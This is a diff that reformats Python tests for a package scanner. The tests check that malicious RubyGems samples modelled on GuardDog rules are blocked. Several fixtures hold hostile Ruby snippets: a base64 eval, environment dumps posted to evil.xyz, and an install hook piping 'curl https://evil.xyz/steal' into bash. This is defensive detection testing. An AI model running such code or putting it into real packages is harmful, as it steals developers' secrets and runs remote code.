@@ -196,42 +196,32 @@ async def test_gd_gems_01_code_execution():
 
 async def test_gd_gems_02_exec_base64():
     """GuardDog: rubygems-exec-base64 — base64 decode + eval"""
-    assert await _blocked_gems(
-        {"extconf.rb": "require 'base64'\neval(Base64.decode64('cHV0cyAiSGVsbG8i'))"}
-    )
+    assert await _blocked_gems({"extconf.rb": "require 'base64'\neval(Base64.decode64('cHV0cyAiSGVsbG8i'))"})
 
 
 async def test_gd_gems_03_exfiltrate_sensitive_data():
     """GuardDog: rubygems-exfiltrate-sensitive-data — env + HTTP"""
     assert await _blocked_gems(
-        {
-            "extconf.rb": "require 'net/http'\nNet::HTTP.get(URI('https://evil.xyz/?d=' + ENV.to_h.to_s))"
-        }
+        {"extconf.rb": "require 'net/http'\nNet::HTTP.get(URI('https://evil.xyz/?d=' + ENV.to_h.to_s))"}
     )
 
 
 async def test_gd_gems_04_install_hook():
     """GuardDog: rubygems-install-hook — malicious extconf.rb"""
-    assert await _blocked_gems(
-        {"extconf.rb": "system('curl https://evil.xyz/steal|bash')"}
-    )
+    assert await _blocked_gems({"extconf.rb": "system('curl https://evil.xyz/steal|bash')"})
 
 
 async def test_gd_gems_05_network_on_require():
     """GuardDog: rubygems-network-on-require — network access on load"""
     assert await _blocked_gems(
-        {
-            "lib/evil.rb": "require 'net/http'\nNet::HTTP.get(URI('https://evil.xyz/exfil?d=' + ENV.to_h.to_s))"
-        }
+        {"lib/evil.rb": "require 'net/http'\nNet::HTTP.get(URI('https://evil.xyz/exfil?d=' + ENV.to_h.to_s))"}
     )
 
 
 async def test_gd_gems_06_serialize_environment():
     """GuardDog: rubygems-serialize-environment — serialize ENV"""
     assert await _blocked_gems(
-        {
-            "extconf.rb": "require 'json'\nrequire 'net/http'\nNet::HTTP.post(URI('https://evil.xyz'), ENV.to_h.to_json)"
-        }
+        {"extconf.rb": "require 'json'\nrequire 'net/http'\nNet::HTTP.post(URI('https://evil.xyz'), ENV.to_h.to_json)"}
     )
 
 
@@ -272,12 +262,12 @@ async def test_summary_go():
             _GO_RESULTS[name] = "FAIL"
 
     rate = passed / total * 100
-    print(f"\n{'='*60}")
+    print(f"\n{'=' * 60}")
     print(f"GuardDog Go coverage: {passed}/{total} ({rate:.0f}%)")
     for name, status in _GO_RESULTS.items():
         icon = "+" if status == "PASS" else "-"
         print(f"  [{icon}] {name}")
-    print(f"{'='*60}")
+    print(f"{'=' * 60}")
     assert rate >= 80, f"Go detection rate {rate:.0f}% below 80% target"
 
 
@@ -303,10 +293,10 @@ async def test_summary_rubygems():
             _GEMS_RESULTS[name] = "FAIL"
 
     rate = passed / total * 100
-    print(f"\n{'='*60}")
+    print(f"\n{'=' * 60}")
     print(f"GuardDog RubyGems coverage: {passed}/{total} ({rate:.0f}%)")
     for name, status in _GEMS_RESULTS.items():
         icon = "+" if status == "PASS" else "-"
         print(f"  [{icon}] {name}")
-    print(f"{'='*60}")
+    print(f"{'=' * 60}")
     assert rate >= 80, f"RubyGems detection rate {rate:.0f}% below 80% target"
